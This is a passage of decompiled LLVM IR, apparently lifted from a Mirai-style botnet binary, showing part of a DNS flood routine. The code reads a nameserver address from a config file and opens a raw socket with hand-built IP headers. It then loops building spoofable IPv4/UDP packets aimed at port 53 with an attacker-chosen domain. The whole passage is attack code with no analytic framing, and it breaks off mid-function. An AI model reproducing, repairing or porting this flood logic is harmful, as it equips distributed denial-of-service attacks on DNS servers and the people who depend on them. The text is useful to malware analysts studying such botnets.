  %v6_c240 = call i32 @attack_get_opt_int(i32 %v0_c238, i32* %v5_c240, i32 4, i32 64, i32 %v7_c228)
  %v1_c248 = urem i32 %v6_c240, 256
  store i32 %v1_c248, i32* %ip.global-to-local, align 4
  %v0_c24c = load i32, i32* @r5, align 4
  store i32 %v0_c24c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c258 = load i32, i32* @r4, align 4
  store i32 %v0_c258, i32* %r0.global-to-local, align 4
  %sext23 = mul i32 %v6_c240, 16777216
  %v5_c260 = sdiv i32 %sext23, 16777216
  %v6_c260 = inttoptr i32 %v0_c24c to i32*
  %v7_c260 = call i32 @attack_get_opt_int(i32 %v0_c258, i32* %v6_c260, i32 5, i32 0, i32 %v5_c260)
  %v1_c26c = urem i32 %v7_c260, 256
  store i32 %v1_c26c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c278 = load i32, i32* @r4, align 4
  store i32 %v0_c278, i32* %r0.global-to-local, align 4
  %v0_c27c = load i32, i32* @r5, align 4
  store i32 %v0_c27c, i32* %r1.global-to-local, align 4
  %v5_c284 = inttoptr i32 %v0_c27c to i32*
  %v6_c284 = call i32 @attack_get_opt_int(i32 %v0_c278, i32* %v5_c284, i32 6, i32 65535, i32 %v1_c26c)
  %v0_c288 = load i32, i32* @r5, align 4
  store i32 %v0_c288, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c294 = load i32, i32* @r4, align 4
  store i32 %v0_c294, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_c29c = inttoptr i32 %v0_c288 to i32*
  %v6_c29c = call i32 @attack_get_opt_int(i32 %v0_c294, i32* %v5_c29c, i32 7, i32 53, i32 %v6_c284)
  %v0_c2a8 = load i32, i32* @r5, align 4
  store i32 %v0_c2a8, i32* %r1.global-to-local, align 4
  %v0_c2ac = load i32, i32* @r4, align 4
  store i32 %v0_c2ac, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_c2b8 = inttoptr i32 %v0_c2a8 to i32*
  %v6_c2b8 = call i32 @attack_get_opt_int(i32 %v0_c2ac, i32* %v5_c2b8, i32 9, i32 65535, i32 %v6_c29c)
  %v0_c2bc = load i32, i32* @r5, align 4
  store i32 %v0_c2bc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_c2c8 = load i32, i32* @r4, align 4
  store i32 %v0_c2c8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_c2d0 = inttoptr i32 %v0_c2bc to i32*
  %v6_c2d0 = call i32 @attack_get_opt_int(i32 %v0_c2c8, i32* %v5_c2d0, i32 0, i32 12, i32 %v6_c2b8)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r5, align 4
  store i32 %v0_c2dc, i32* %r1.global-to-local, align 4
  store i32 %v6_c2d0, i32* %sb.global-to-local, align 4
  %v0_c2e4 = load i32, i32* @r4, align 4
  store i32 %v0_c2e4, i32* %r0.global-to-local, align 4
  %v4_c2e8 = inttoptr i32 %v0_c2dc to i32*
  %v5_c2e8 = call i32 @attack_get_opt_str(i32 %v0_c2e4, i32* %v4_c2e8, i32 8, i32 0)
  store i32 %v5_c2e8, i32* @r7, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_c2f4 = call i32 @table_unlock_val(i32 26)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_c300 = call i32 @table_retrieve_val(i32 26, i32* null)
  store i32 %v3_c300, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_c308 = call i32 @__libc_open(i32 %v3_c300, i32 0)
  store i32 %v2_c308, i32* @r4, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_c314 = call i32 @table_lock_val(i32 26)
  store i32 %v1_c314, i32* %r0.global-to-local, align 4
  %v0_c318 = load i32, i32* @r4, align 4
  %v1_c318 = icmp slt i32 %v0_c318, 0
  %v2_c318 = icmp eq i32 %v0_c318, 0
  store i1 %v2_c318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_c318, label %dec_label_pc_c814, label %dec_label_pc_c320

dec_label_pc_c320:                                ; preds = %entry
  %v2_c324 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_c324, i32* @sl, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_c324, i32* @r1, align 4
  store i32 %v0_c318, i32* %r0.global-to-local, align 4
  %v1_c334 = call i32 @__libc_read(i32 %v0_c318)
  store i32 %v1_c334, i32* @r5, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  store i32 %v0_c33c, i32* %r0.global-to-local, align 4
  %v1_c340 = call i32 @__GI___libc_close(i32 %v0_c33c)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_c348 = call i32 @table_unlock_val(i32 27)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_c354 = call i32 @table_retrieve_val(i32 27, i32* null)
  %v0_c358 = load i32, i32* @r5, align 4
  store i32 %v0_c358, i32* @r1, align 4
  store i32 %v3_c354, i32* %r2.global-to-local, align 4
  store i32 %v2_c324, i32* %r0.global-to-local, align 4
  %v3_c364 = bitcast i32* %stack_var_-2124 to i8*
  %v4_c364 = call i32 @util_stristr(i8* %v3_c364, i32 %v0_c358, i32 %v3_c354)
  store i32 %v4_c364, i32* @r6, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_c370 = call i32 @table_lock_val(i32 27)
  store i32 %v1_c370, i32* %r0.global-to-local, align 4
  %v0_c374 = load i32, i32* @r6, align 4
  %v7_c374 = icmp eq i32 %v0_c374, -1
  store i1 %v7_c374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c374, label %dec_label_pc_c814, label %dec_label_pc_c37c

dec_label_pc_c37c:                                ; preds = %dec_label_pc_c320
  %v0_c37c = load i32, i32* @r5, align 4
  %v9_c37c = icmp eq i32 %v0_c37c, %v0_c374
  store i1 %v9_c37c, i1* %cpsr_z.global-to-local, align 1
  %v7_c380 = icmp sgt i32 %v0_c37c, %v0_c374
  br i1 %v7_c380, label %dec_label_pc_c384, label %dec_label_pc_c814

dec_label_pc_c384:                                ; preds = %dec_label_pc_c37c
  %v0_c384 = load i32, i32* @sl, align 4
  %v2_c384 = add i32 %v0_c384, %v0_c374
  store i32 %v2_c384, i32* %r1.global-to-local, align 4
  store i32 %v0_c374, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_c3b0 = add i32 %v0_c37c, -1
  br label %dec_label_pc_c3a8

dec_label_pc_c394:                                ; preds = %dec_label_pc_c3d0, %bb104
  %v9_c394 = icmp eq i32 %v1_c3b0, %v0_c39c
  store i1 %v9_c394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c394, label %dec_label_pc_c3e0, label %dec_label_pc_c39c

dec_label_pc_c39c:                                ; preds = %dec_label_pc_c3c0, %dec_label_pc_c394, %bb
  %v0_c3cc29 = phi i32 [ %v0_c3cc, %dec_label_pc_c3c0 ], [ %v0_c3cc30, %dec_label_pc_c394 ], [ %v0_c3cc, %bb ]
  %v0_c3ac25 = phi i32 [ 0, %dec_label_pc_c3c0 ], [ %v0_c3ac26, %dec_label_pc_c394 ], [ 0, %bb ]
  %v1_c39c = add i32 %v0_c39c, 1
  store i32 %v1_c39c, i32* %r2.global-to-local, align 4
  %v9_c3a0 = icmp eq i32 %v1_c39c, %v0_c37c
  store i1 %v9_c3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c3a0, label %dec_label_pc_c814, label %dec_label_pc_c3a8

dec_label_pc_c3a8:                                ; preds = %dec_label_pc_c39c, %dec_label_pc_c384
  %v0_c39c = phi i32 [ %v1_c39c, %dec_label_pc_c39c ], [ %v0_c374, %dec_label_pc_c384 ]
  %v0_c3cc = phi i32 [ %v0_c3cc29, %dec_label_pc_c39c ], [ 0, %dec_label_pc_c384 ]
  %v0_c3ac = phi i32 [ %v0_c3ac25, %dec_label_pc_c39c ], [ 0, %dec_label_pc_c384 ]
  %v0_c3b4 = phi i32 [ %v1_c3b4, %dec_label_pc_c39c ], [ %v2_c384, %dec_label_pc_c384 ]
  %v1_c3a8 = inttoptr i32 %v0_c3b4 to i8*
  %v2_c3a8 = load i8, i8* %v1_c3a8, align 1
  %v3_c3a8 = zext i8 %v2_c3a8 to i32
  store i32 %v3_c3a8, i32* %r3.global-to-local, align 4
  %v2_c3ac = icmp eq i32 %v0_c3ac, 0
  store i1 %v2_c3ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c3b0, i32* @r4, align 4
  %v1_c3b4 = add i32 %v0_c3b4, 1
  store i32 %v1_c3b4, i32* %r1.global-to-local, align 4
  %v1_c3b8 = add nsw i32 %v3_c3a8, -48
  store i32 %v1_c3b8, i32* %r0.global-to-local, align 4
  br i1 %v2_c3ac, label %dec_label_pc_c3c0, label %dec_label_pc_c3d0

dec_label_pc_c3c0:                                ; preds = %dec_label_pc_c3a8
  %v7_c3c0 = icmp eq i8 %v2_c3a8, 9
  store i1 %v7_c3c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3c0, label %dec_label_pc_c39c, label %bb

bb:                                               ; preds = %dec_label_pc_c3c0
  %v8_c3c4 = icmp eq i8 %v2_c3a8, 32
  store i1 %v8_c3c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c3c4, label %dec_label_pc_c39c, label %dec_label_pc_c3cc

dec_label_pc_c3cc:                                ; preds = %bb
  %v1_c3cc = add i32 %v0_c3cc, 1
  store i32 %v1_c3cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c3d0

dec_label_pc_c3d0:                                ; preds = %dec_label_pc_c3a8, %dec_label_pc_c3cc
  %v0_c3cc30 = phi i32 [ %v0_c3cc, %dec_label_pc_c3a8 ], [ %v1_c3cc, %dec_label_pc_c3cc ]
  %v0_c3ac26 = phi i32 [ %v0_c3ac, %dec_label_pc_c3a8 ], [ %v1_c3cc, %dec_label_pc_c3cc ]
  %v7_c3d0 = icmp eq i8 %v2_c3a8, 46
  store i1 %v7_c3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3d0, label %dec_label_pc_c394, label %bb104

bb104:                                            ; preds = %dec_label_pc_c3d0
  %v8_c3d4 = icmp eq i32 %v1_c3b8, 9
  store i1 %v8_c3d4, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_c3b8, 10
  br i1 %tmp, label %dec_label_pc_c394, label %dec_label_pc_c3dc

dec_label_pc_c3dc:                                ; preds = %bb104
  br label %dec_label_pc_c3e0

dec_label_pc_c3e0:                                ; preds = %dec_label_pc_c394, %dec_label_pc_c3dc
  %v0_c39c127 = phi i32 [ %v0_c39c, %dec_label_pc_c3dc ], [ %v1_c3b0, %dec_label_pc_c394 ]
  %v2_c3e4 = sub i32 %v0_c39c127, %v0_c374
  store i32 %v2_c3e4, i32* @r4, align 4
  %v2_c3e8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_c384, i32* %r1.global-to-local, align 4
  store i32 %v2_c3e8, i32* %r0.global-to-local, align 4
  store i32 %v2_c3e4, i32* %r2.global-to-local, align 4
  %v3_c3f8 = call i32 @util_memcpy(i32 %v2_c3e8, i32 %v2_c384, i32 %v2_c3e4)
  %v2_c3fc = ptrtoint i32* %stack_var_-40 to i32
  %v1_c400 = load i32, i32* @r4, align 4
  %v2_c400 = add i32 %v1_c400, %v2_c3fc
  store i32 %v2_c400, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c3e8, i32* @r0, align 4
  %v3_c40c = add i32 %v2_c400, -36
  %v4_c40c = inttoptr i32 %v3_c40c to i8*
  store i8 0, i8* %v4_c40c, align 1
  %v1_c410 = call i32 @inet_addr(i32 %v2_c3e8)
  store i32 %v1_c410, i32* %r0.global-to-local, align 4
  store i32 %v1_c410, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c4189:                               ; preds = %dec_label_pc_c814
  unreachable

dec_label_pc_c418:                                ; preds = %dec_label_pc_c874, %dec_label_pc_c86c, %dec_label_pc_c860, %dec_label_pc_c850, %dec_label_pc_c3e0
  %v1_c84c50 = phi i32 [ %v1_c818, %dec_label_pc_c874 ], [ %v1_c818, %dec_label_pc_c86c ], [ %v1_c818, %dec_label_pc_c860 ], [ %v1_c818, %dec_label_pc_c850 ], [ %v1_c410, %dec_label_pc_c3e0 ]
  %v0_c418 = load i32, i32* @r7, align 4
  %v2_c418 = icmp eq i32 %v0_c418, 0
  store i1 %v2_c418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c418, label %dec_label_pc_c840, label %dec_label_pc_c420

dec_label_pc_c420:                                ; preds = %dec_label_pc_c418
  store i32 %v0_c418, i32* %r0.global-to-local, align 4
  %v1_c424 = inttoptr i32 %v0_c418 to i8*
  %v2_c424 = call i32 @util_strlen(i8* %v1_c424)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_c424, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c438 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v7_c43c = icmp eq i32 %v3_c438, -1
  store i1 %v7_c43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c43c, label %dec_label_pc_c840, label %dec_label_pc_c448

dec_label_pc_c448:                                ; preds = %dec_label_pc_c420
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c450 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c450, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c464 = call i32 @__GI_setsockopt(i32 %v3_c438, i32 0, i32 3, i32 %v6_c450, i32 4)
  store i32 %v5_c464, i32* %r0.global-to-local, align 4
  %v7_c468 = icmp eq i32 %v5_c464, -1
  store i1 %v7_c468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c468, label %dec_label_pc_c838, label %dec_label_pc_c470

dec_label_pc_c470:                                ; preds = %dec_label_pc_c448
  %v0_c478 = load i32, i32* %sb.global-to-local, align 4
  %v1_c478 = urem i32 %v0_c478, 256
  store i32 %v1_c478, i32* %sb.global-to-local, align 4
  %v3_c480 = mul i32 %v6_c284, 65536
  store i32 %v3_c480, i32* %r3.global-to-local, align 4
  %v5_c48c = trunc i32 %v0_c478 to i8
  %v0_c490 = load i32, i32* @r8, align 4
  %v2_c490 = icmp eq i32 %v0_c490, 0
  store i1 %v2_c490, i1* %cpsr_z.global-to-local, align 1
  %v3_c494 = urem i32 %v7_c228, 65536
  store i32 %v3_c494, i32* %r0.global-to-local, align 4
  %v3_c49c = urem i32 %v6_c284, 65536
  store i32 %v3_c49c, i32* %r2.global-to-local, align 4
  %v3_c4a0 = mul i32 %v6_c29c, 65536
  %v3_c4a4 = mul i32 %v6_c2b8, 65536
  store i32 %v3_c4a4, i32* %ip.global-to-local, align 4
  br i1 %v2_c490, label %bb105, label %bb106

bb105:                                            ; preds = %dec_label_pc_c470
  %v5_c4ac = sext i8 %v5_c48c to i32
  store i32 %v5_c4ac, i32* %r2.global-to-local, align 4
  br label %bb106

bb106:                                            ; preds = %dec_label_pc_c470, %bb105
  %v2_c4d8 = phi i32 [ %v3_c49c, %dec_label_pc_c470 ], [ %v5_c4ac, %bb105 ]
  %v3_c4b8 = urem i32 %v6_c29c, 65536
  store i32 %v3_c4b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_c4c0 = urem i32 %v6_c2b8, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_c4d8 = load i32, i32* @r6, align 4
  br i1 %v2_c490, label %.dec_label_pc_c6c0.preheader_crit_edge, label %dec_label_pc_c4e0

.dec_label_pc_c6c0.preheader_crit_edge:           ; preds = %bb106
  %v3_c4d8 = add i32 %v1_c4d8, %v2_c4d8
  store i32 %v3_c4d8, i32* @r7, align 4
  %.pre = sext i8 %v5_c48c to i32
  br label %dec_label_pc_c6c0.preheader

dec_label_pc_c4e0:                                ; preds = %bb106
  %v2_c4e0 = add i32 %v1_c4d8, %v1_c478
  %v3_c4e4 = mul i32 %v2_c4e0, 65536
  %v1_c4ec = add i32 %v3_c4e4, 1769472
  %v1_c4f0 = add i32 %v3_c4e4, 3080192
  %tmp107 = udiv i32 %v1_c4f0, 256
  %v3_c504 = and i32 %tmp107, 65280
  %v4_c514 = udiv i32 %v1_c4f0, 16777216
  %v5_c514 = or i32 %v3_c504, %v4_c514
  store i32 %v5_c514, i32* @sl, align 4
  %trunc61 = trunc i32 %v6_c284 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc61)
  %tmp108 = mul i32 %v7_c228, 256
  %v3_c528 = and i32 %tmp108, 65280
  store i32 %v3_c528, i32* %r1.global-to-local, align 4
  %tmp109 = udiv i32 %v7_c228, 256
  %v4_c52c = urem i32 %tmp109, 256
  %v5_c52c = or i32 %v4_c52c, %v3_c528
  store i32 %v5_c52c, i32* @sb, align 4
  store i32 %v3_c4a4, i32* %r2.global-to-local, align 4
  store i32 %v3_c4a0, i32* %r0.global-to-local, align 4
  %tmp110 = mul i32 %v6_c29c, 256
  %v3_c540 = and i32 %tmp110, 65280
  %tmp111 = mul i32 %v6_c2b8, 256
  %v3_c544 = and i32 %tmp111, 65280
  %tmp112 = udiv i32 %v1_c4ec, 256
  %v3_c548 = and i32 %tmp112, 65280
  store i32 %v3_c548, i32* @lr, align 4
  %tmp113 = udiv i32 %v6_c29c, 256
  %v4_c54c = urem i32 %tmp113, 256
  %v5_c54c = or i32 %v4_c54c, %v3_c540
  store i32 %v5_c54c, i32* %ip.global-to-local, align 4
  %tmp114 = udiv i32 %v6_c2b8, 256
  %v4_c550 = urem i32 %tmp114, 256
  %v5_c550 = or i32 %v4_c550, %v3_c544
  store i32 %v5_c550, i32* @r4, align 4
  %v1_c554 = add i32 %v1_c4d8, 1
  store i32 %v1_c554, i32* %r3.global-to-local, align 4
  %v4_c558 = udiv i32 %v1_c4ec, 16777216
  %v5_c558 = or i32 %v4_c558, %tmp112
  store i32 0, i32* @r5, align 4
  %v4_c5dc = sext i8 %v5_c48c to i32
  %sext = mul nuw i32 %v5_c54c, 65536
  %v7_c5f0 = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_c550, 65536
  %v4_c618 = sdiv i32 %sext8, 65536
  %v1_c5b8 = trunc i32 %v5_c228 to i8
  %extract.t = trunc i32 %v5_c260 to i8
  %v1_c5e0 = add nsw i32 %v4_c5dc, 41
  %sext121 = mul i32 %v5_c558, 65536
  %v3_c5f0 = sdiv i32 %sext121, 65536
  br label %dec_label_pc_c570

dec_label_pc_c570:                                ; preds = %dec_label_pc_c690, %dec_label_pc_c4e0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_c578 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_c578, i32* %r0.global-to-local, align 4
  store i32 %v2_c1ec, i32* %ip.global-to-local, align 4
  %v3_c580 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c580, i32* %r3.global-to-local, align 4
  %v2_c584 = load i32, i32* @r5, align 4
  %v5_c584 = mul i32 %v2_c584, 4
  %v6_c584 = add i32 %v5_c584, %v2_c1ec
  %v7_c584 = inttoptr i32 %v6_c584 to i32*
  store i32 %v2_c578, i32* %v7_c584, align 4
  %v0_c588 = load i32, i32* %ip.global-to-local, align 4
  %v1_c588 = load i32, i32* %r3.global-to-local, align 4
  %v4_c588 = mul i32 %v1_c588, 4
  %v5_c588 = add i32 %v4_c588, %v0_c588
  %v6_c588 = inttoptr i32 %v5_c588 to i32*
  %v7_c588 = load i32, i32* %v6_c588, align 4
  store i32 %v7_c588, i32* %r1.global-to-local, align 4
  %v1_c58c = inttoptr i32 %v7_c588 to i8*
  %v2_c58c = load i8, i8* %v1_c58c, align 1
  %tmp132 = urem i8 %v2_c58c, 16
  %v1_c590 = zext i8 %tmp132 to i32
  %v1_c594 = or i32 %v1_c590, 64
  store i32 %v1_c594, i32* %r2.global-to-local, align 4
  %v1_c598 = trunc i32 %v1_c594 to i8
  store i8 %v1_c598, i8* %v1_c58c, align 1
  %v0_c59c = load i32, i32* %r1.global-to-local, align 4
  %v1_c59c = inttoptr i32 %v0_c59c to i8*
  %v2_c59c = load i8, i8* %v1_c59c, align 1
  %v3_c59c = zext i8 %v2_c59c to i32
  %v1_c5a0 = and i32 %v3_c59c, 240
  %v1_c5a4 = or i32 %v1_c5a0, 5
  store i32 %v1_c5a4, i32* %r3.global-to-local, align 4
  store i32 %v1_c26c, i32* %lr.global-to-local, align 4
  %v1_c5ac = trunc i32 %v1_c5a4 to i8
  store i8 %v1_c5ac, i8* %v1_c59c, align 1
  store i32 %v5_c228, i32* %r0.global-to-local, align 4
  %v0_c5b4 = load i32, i32* %lr.global-to-local, align 4
  %v2_c5b4 = icmp eq i32 %v0_c5b4, 0
  store i1 %v2_c5b4, i1* %cpsr_z.global-to-local, align 1
  %v2_c5b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5b8 = add i32 %v2_c5b8, 1
  %v4_c5b8 = inttoptr i32 %v3_c5b8 to i8*
  store i8 %v1_c5b8, i8* %v4_c5b8, align 1
  store i32 %v5_c260, i32* %r2.global-to-local, align 4
  %v0_c5c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c5c0, label %.thread11, label %bb115

bb115:                                            ; preds = %dec_label_pc_c570
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c5c4 = load i32, i32* %r1.global-to-local, align 4
  %v4_c5c4 = add i32 %v3_c5c4, 6
  %v5_c5c4 = inttoptr i32 %v4_c5c4 to i16*
  store i16 64, i16* %v5_c5c4, align 2
  %v0_c5cc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t53 = trunc i32 %v0_c5cc.pre to i8
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_c570, %bb115
  %v0_c5cc.off0 = phi i8 [ %extract.t, %dec_label_pc_c570 ], [ %extract.t53, %bb115 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_c5cc = load i32, i32* %r1.global-to-local, align 4
  %v3_c5cc = add i32 %v2_c5cc, 8
  %v4_c5cc = inttoptr i32 %v3_c5cc to i8*
  store i8 %v0_c5cc.off0, i8* %v4_c5cc, align 1
  %v0_c5d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5d0 = trunc i32 %v0_c5d0 to i8
  %v2_c5d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5d0 = add i32 %v2_c5d0, 9
  %v4_c5d0 = inttoptr i32 %v3_c5d0 to i8*
  store i8 %v1_c5d0, i8* %v4_c5d0, align 1
  %v2_c5d8 = load i32, i32* @global_var_24f40.59, align 4
  %v0_c5e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_c5e4 = add i32 %v1_c5e0, %v0_c5e0
  store i32 %v2_c5e4, i32* @r4, align 4
  %v2_c5e8 = add i32 %v0_c5e0, 12
  %v3_c5e8 = inttoptr i32 %v2_c5e8 to i32*
  store i32 %v2_c5d8, i32* %v3_c5e8, align 4
  store i32 %v3_c5f0, i32* %r2.global-to-local, align 4
  store i32 %v7_c5f0, i32* %r3.global-to-local, align 4
  %v0_c5f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5f4 = add i32 %v0_c5f4, 20
  store i32 %v1_c5f4, i32* %ip.global-to-local, align 4
  %v0_c5f8 = load i32, i32* @sl, align 4
  %v1_c5f8 = trunc i32 %v0_c5f8 to i16
  %v3_c5f8 = add i32 %v0_c5f4, 2
  %v4_c5f8 = inttoptr i32 %v3_c5f8 to i16*
  store i16 %v1_c5f8, i16* %v4_c5f8, align 2
  %v0_c5fc = load i32, i32* @sb, align 4
  %v1_c5fc = trunc i32 %v0_c5fc to i16
  %v2_c5fc = load i32, i32* %r1.global-to-local, align 4
  %v3_c5fc = add i32 %v2_c5fc, 4
  %v4_c5fc = inttoptr i32 %v3_c5fc to i16*
  store i16 %v1_c5fc, i16* %v4_c5fc, align 2
  %v0_c600 = load i32, i32* %r2.global-to-local, align 4
  %v1_c600 = trunc i32 %v0_c600 to i16
  %v2_c600 = load i32, i32* %ip.global-to-local, align 4
  %v3_c600 = add i32 %v2_c600, 4
  %v4_c600 = inttoptr i32 %v3_c600 to i16*
  store i16 %v1_c600, i16* %v4_c600, align 2
  %v0_c604 = load i32, i32* %r3.global-to-local, align 4
  %v1_c604 = trunc i32 %v0_c604 to i16
  %v2_c604 = load i32, i32* %ip.global-to-local, align 4
  %v3_c604 = add i32 %v2_c604, 2
  %v4_c604 = inttoptr i32 %v3_c604 to i16*
  store i16 %v1_c604, i16* %v4_c604, align 2
  %v2_c60c = load i32, i32* %r1.global-to-local, align 4
  %v3_c60c = add i32 %v2_c60c, 20
  %v4_c60c = inttoptr i32 %v3_c60c to i16*
  store i16 %rev, i16* %v4_c60c, align 2
  store i32 %v4_c5dc, i32* %ip.global-to-local, align 4
  %v0_c614 = load i32, i32* %r1.global-to-local, align 4
  %v1_c614 = add i32 %v0_c614, 28
  store i32 %v1_c614, i32* %r0.global-to-local, align 4
  store i32 %v4_c618, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_c624 = add i32 %v0_c614, 30
  %v4_c624 = inttoptr i32 %v3_c624 to i16*
  store i16 1, i16* %v4_c624, align 2
  %v0_c628 = load i32, i32* @lr, align 4
  %v1_c628 = trunc i32 %v0_c628 to i16
  %v2_c628 = load i32, i32* %r0.global-to-local, align 4
  %v3_c628 = add i32 %v2_c628, 4
  %v4_c628 = inttoptr i32 %v3_c628 to i16*
  store i16 %v1_c628, i16* %v4_c628, align 2
  %v0_c62c = load i32, i32* %ip.global-to-local, align 4
  %v1_c62c = trunc i32 %v0_c62c to i8
  %v2_c62c = load i32, i32* %r1.global-to-local, align 4
  %v3_c62c = add i32 %v2_c62c, 40
  %v4_c62c = inttoptr i32 %v3_c62c to i8*
  store i8 %v1_c62c, i8* %v4_c62c, align 1
  %v0_c630 = load i32, i32* @fp, align 4
  %v1_c630 = load i32, i32* %r1.global-to-local, align 4
  %v2_c630 = add i32 %v1_c630, 16
  %v3_c630 = inttoptr i32 %v2_c630 to i32*
  store i32 %v0_c630, i32* %v3_c630, align 4
  %v0_c634 = load i32, i32* %r3.global-to-local, align 4
  %v1_c634 = trunc i32 %v0_c634 to i16
  %v2_c634 = load i32, i32* %r1.global-to-local, align 4
  %v3_c634 = add i32 %v2_c634, 28
  %v4_c634 = inttoptr i32 %v3_c634 to i16*
  store i16 %v1_c634, i16* %v4_c634, align 2
  %v0_c638 = load i32, i32* @r4, align 4
  %v1_c638 = add i32 %v0_c638, 1
  store i32 %v1_c638, i32* %r0.global-to-local, align 4
  %v0_c63c = load i32, i32* @r7, align 4
  store i32 %v0_c63c, i32* %r1.global-to-local, align 4
  store i32 %v1_c554, i32* %r2.global-to-local, align 4
  %v3_c644 = call i32 @util_memcpy(i32 %v1_c638, i32 %v0_c63c, i32 %v1_c554)
  store i32 %v3_c644, i32* %r0.global-to-local, align 4
  %v0_c648 = load i32, i32* @r6, align 4
  %v2_c648 = icmp eq i32 %v0_c648, 0
  store i1 %v2_c648, i1* %cpsr_z.global-to-local, align 1
  %tmp116 = icmp slt i32 %v0_c648, 1
  br i1 %tmp116, label %bb117, label %dec_label_pc_c658

bb117:                                            ; preds = %.thread11
  %v5_c64c = load i32, i32* @r4, align 4
  store i32 %v5_c64c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c690

dec_label_pc_c658:                                ; preds = %.thread11
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_c65c = load i32, i32* @r4, align 4
  store i32 %v0_c65c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %.thread18, %dec_label_pc_c658
  %v0_c670 = phi i32 [ %storemerge, %.thread18 ], [ 0, %dec_label_pc_c658 ]
  %v0_c674 = phi i32 [ %v0_c688, %.thread18 ], [ 0, %dec_label_pc_c658 ]
  %v1_c664 = load i32, i32* @r7, align 4
  %v2_c664 = add i32 %v1_c664, %v0_c674
  %v3_c664 = inttoptr i32 %v2_c664 to i8*
  %v4_c664 = load i8, i8* %v3_c664, align 1
  %v6_c664 = zext i8 %v4_c664 to i32
  store i32 %v6_c664, i32* %r3.global-to-local, align 4
  %v7_c668 = icmp eq i8 %v4_c664, 46
  store i1 %v7_c668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c668, label %bb118, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_c664
  %v1_c67014 = add nsw i32 %v0_c670, 1
  store i32 %v1_c67014, i32* %r2.global-to-local, align 4
  %v1_c67416 = add i32 %v0_c674, 1
  store i32 %v1_c67416, i32* %r1.global-to-local, align 4
  br label %bb119

bb118:                                            ; preds = %dec_label_pc_c664
  %v2_c66c = load i32, i32* @r4, align 4
